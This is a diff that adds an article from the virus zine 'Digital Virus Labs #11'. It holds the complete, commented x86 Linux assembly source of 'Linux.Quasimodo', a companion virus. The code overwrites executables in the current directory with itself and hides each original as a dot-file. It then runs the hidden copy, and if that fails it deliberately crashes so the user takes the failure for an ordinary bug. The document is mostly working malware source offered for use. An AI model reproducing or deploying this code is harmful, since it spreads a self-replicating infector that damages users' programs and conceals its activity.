@@ -1,0 +1,267 @@
+
+ - [Digital Virus Labs #11] - [Page 14] -
+
+ Linux.Quasimodo
+ (c) by Gobleen Warrior/SMF
+
+#
+#                             <Linux.Quasimodo>
+#
+#    Это мой первый вирь под Linux. Примитивный компанион. Поражает файлы в
+# текущем каталоге, копируя их в файлы, с именами типа ".ИМЯ", где ИМЯ -
+# оригинальное имя файла. Такие файлы в Linux являются скрытыми. Проверяет
+# заражаемые файлы на право записи текущим пользователем, и заражает только в
+# случае допустимости запуска. Обоим файлам (и оригинальному, и компаниону
+# ставит атрибуты rwxr-xr-x. После обработки всех доступных файлов запускает
+# файл ".ИМЯ", где ИМЯ - имя запущенного файла. В случае отсуствия в текущем
+# каталоге вышеуказанного файла, вызывает деление на ноль, для эмуляции
+# ошибки в программе.
+#    Вирь крайне прост, неоптимизирован, и вообще убог и страшен, отсюда и
+# название. Но с учетом того, что Linux я учу (на момент написания) около
+# трех недель, по моему все не так уж и плохо. По крайней мере я на это
+# надеюсь :)))
+#
+# 17.2.01                                            (C) Gobleen Warrior//SMF
+
+# as -o quasi.o quasi.s
+# ld -s -o quasi quasi.o
+
+                        .text
+                        .globl _start
+
+_start:
+# Сохраним адрес нулевого аргумента командной строки (argv[0]) - имени
+# запущенного файла.
+                        popl %eax                       # argc
+                        popl %eax                       # argv[0]
+                        movl %eax, our_name_addr
+
+# Откроем текущий каталог
+                        movl $5, %eax                   # Open
+                        movl $current_dir, %ebx
+                        xorl %ecx, %ecx
+                        int $0x80
+
+                        movl %eax, dir_handle
+                        incl %eax                       # Ошибки?
+                        jz exit
+
+# Считаем записи в каталоге
+next_file:              movl $89, %eax                  # ReadDir
+                        movl dir_handle, %ebx
+                        movl $name_buffa, %ecx
+                        int $0x80
+
+                        decl %eax                       # Есть файл?
+                        jnz exit
+
+# Проверим имя на символ точки в начале.
+                        cmpb $0x2e, name_buffa+10       # Проверка на "." в
+                        je next_file                    # начале имени файла
+
+# Имемем ли мы право запуска найденного файла?
+                        movl $33, %eax                  # Access
+                        movl $name_buffa+10, %ebx
+                        movl $1, %ecx                   # на запуск
+                        int $0x80
+
+                        orl %eax, %eax                  # Низзя?
+                        jnz next_file                   # К другому файлу
+
+# Сформируем имя с точкой в начале - засунем ее в буфер перед оригинальным
+# именем, то есть по адресу name_buffa+9
+                        movb $0x2e, name_buffa+9
+
+# Проверим наличие файла ".<ИМЯ>" путем попытки создания его
+                        movl $5, %eax                   # Open
+                        movl $name_buffa+9, %ebx        # .<ИМЯ>
+                        movl $0001|0100|0200, %ecx      # create+write+excl
+                        movl $0755, %edx
+                        int $0x80
+
+                        cmpl $0, %eax                   # Файл существует?
+                        jge no_dotted                   # Нет? Создадим его :))
+
+                        movl %eax, %ebx                 # Да? - Закроем его
+                        movl $6, %eax
+                        int $0x80
+
+                        jmp next_file                   # И к другому файлу
+
+# Файл-компанион создан и его дескриптор в %EAX
+no_dotted:              movl %eax, dotted_fd            # сохраним дескриптор
+
+# Откроем найденный файл для чтения/записи
+                        movl $5, %eax
+                        movl $name_buffa+10, %ebx
+                        movl $2, %ecx
+                        int $0x80
+
+                        cmpl $0, %eax                   # Ошибки?
+                        jge victim_opened               # Нет? Замечательно :))
+
+# Если произошла ошибка - удалим файл-компанион
+del_dotted:             movl $10, %eax                  # Unlink
+                        movl $name_buffa+9, %ebx        # С точкой в имени
+                        int $0x80
+                        jmp next_file                   # К следующему файлу
+
+# Если нет ошибок, обработаем файл
+victim_opened:          movl %eax, victim_fd            # сохраним дескриптор
+
+# Считать блок (512 байт) из найденного файла
+read_block:             movl $3, %eax
+                        movl victim_fd, %ebx
+                        movl $read_buffa, %ecx
+                        movl $512, %edx
+                        int $0x80
+
+                        cmp $-1, %eax                   # Ошибки?
+                        jne write_to_dotted             # Нет? Запишем блок
+                                                        # в компаниона
+# Есть ошибки? Закроем найденный и компанионский файлы
+shit_fuck:              movl $6, %eax
+                        movl victim_fd, %ebx
+                        int $0x80
+                        movl $6, %eax
+                        movl dotted_fd, %ebx
+                        int $0x80
+                        jmp del_dotted
+
+# Запишем блок в файл с точкой в имени
+write_to_dotted:        movl %eax, %edx                 # Размер записываемого
+                        movl $4, %eax                   # Write
+                        movl dotted_fd, %ebx            # В файл с точкой
+                        movl $read_buffa, %ecx
+                        int $0x80
+
+                        cmp $512, %eax                  # Записано 512?
+                        je read_block                   # Следующий блок
+
+# Если было записано не 512 байт, значит или все скопировано, или ошибка.
+                        cmp $-1, %eax
+                        je shit_fuck                    # Ага, ошибка :(
+
+# Нет ошибки. Значит весь найденный файл скопирован в компаниона и можно этот
+# компанионский файл закрыть
+                        movl $6, %eax                   # Close
+                        movl dotted_fd, %ebx
+                        int $0x80
+
+# Передвинуть указатель работы с файлом в его начало
+                        movl $19, %eax                  # Lseek
+                        movl victim_fd, %ebx
+                        xorl %ecx, %ecx                 # На ноль байтов
+                        xorl %edx, %edx                 # От начала
+                        int $0x80
+
+# Открыть себя самого
+                        movl $5, %eax
+                        movl our_name_addr, %ebx
+                        xorl %ecx, %ecx
+                        int $0x80
+
+                        cmpl $0, %eax                   # Ошибки?
+                        jge we_are_openned              # Нет. Все в порядке.
+
+# Если произошла ошибка, закроем найденный файл
+close_vict_err:         movl $6, %eax
+                        movl victim_fd, %ebx
+                        int $0x80
+                        jmp del_dotted                  # И удалим его копию
+                                                        # с точкой в имени
+# Мы открыты - скопируем себя в начало найденного файла
+we_are_openned:         movl %eax, our_fd               # Сохраним дескриптор
+
+# Считаем блок в 512 байт из себя
+read_us:                movl $3, %eax
+                        movl our_fd, %ebx
+                        movl $read_buffa, %ecx
+                        movl $512, %edx
+                        int $0x80
+
+                        cmp $-1, %eax                   # Ошибки?
+                        jne write_to_victim
+
+# Ага, ошибки. Закроем себя.
+iopti:                  movl $6, %eax
+                        movl our_fd, %ebx
+                        int $0x80
+                        jmp close_vict_err              # Закроем жертву
+                                                        # и удалим компаниона
+# Запишем считанный блок в найденный файл
+write_to_victim:        movl %eax, %edx                 # Сколько писать
+                        movl $4, %eax                   # Write
+                        movl victim_fd, %ebx            # В найденный файл
+                        movl $read_buffa, %ecx
+                        int $0x80
+
+                        cmp $512, %eax
+                        je read_us                      # Обработать следующий
+                                                        # блок
+# Если было записано не 512 байт, значит или все скопировано, или ошибка.
+                        cmp $-1, %eax
+                        je iopti                        # Да. Была ошибка.
+
+# Нет ошибок? Значит мы полностью скопировались в начало найденного файла,
+# теперь можно закрыть его.
+                        movl $6, %eax                   # Close
+                        movl victim_fd, %ebx
+                        int $0x80
+
+# Установим найденному файлу права доступа 755 - rwxr-xr-x
+                        movl $15, %eax                  # Chmod
+                        movl $name_buffa+10, %ebx
+                        movl $0755, %ecx
+                        int $0x80
+
+# Обработаем следующий файл
+                        jmp next_file
+
+# Подготовим к запуску наш собственный файл-компанион.
+exit:                   movb $'.', name_buffa
+                        movl our_name_addr, %esi
+                        movl $name_buffa+1, %edi
+                        lodsw
+                        cmpw $0x2f2e, %ax               # Пропустить "./"
+                        je next_sign                    # в начале имени
+                        stosw
+next_sign:              lodsb
+                        orb %al, %al
+                        jz end_name
+                        stosb
+                        jmp next_sign
+end_name:               stosb
+
+# Поместим адрес строки с именем запускаемого файла в argv[0]
+                        movl $name_buffa, %eax
+                        movl %eax, args
+
+# Запустим файл
+                        movl $11,%eax                   # Execve
+                        movl $name_buffa, %ebx
+                        movl $args, %ecx                # offset argv[]
+                        movl $envp, %edx                # offset envp[]
+                        int $0x80
+
+# Если мы еще работаем, значит при запуске произошла ошибка. В таком случае
+# произведем деление на ноль - пусть юзер думает, что в файле ошибка.
+                        xorl %eax, %eax
+                        divl %eax
+
+                        .data                   # Инициализированные данные
+                        .ascii "[Linux.Quasimodo] by Gobleen Warrior//SMF"
+current_dir:            .asciz "."
+
+                        .bss                    # Неинициализированные данные
+flag1:                  .int 0
+our_name_addr:          .int 0
+dotted_fd:              .int 0
+victim_fd:              .int 0
+our_fd:                 .int 0
+dir_handle:             .int 0
+args:                   .int 0
+                        .int 0
+envp:                   .int 0
+name_buffa:             .skip 128, 0
+read_buffa:             .skip 512, 0
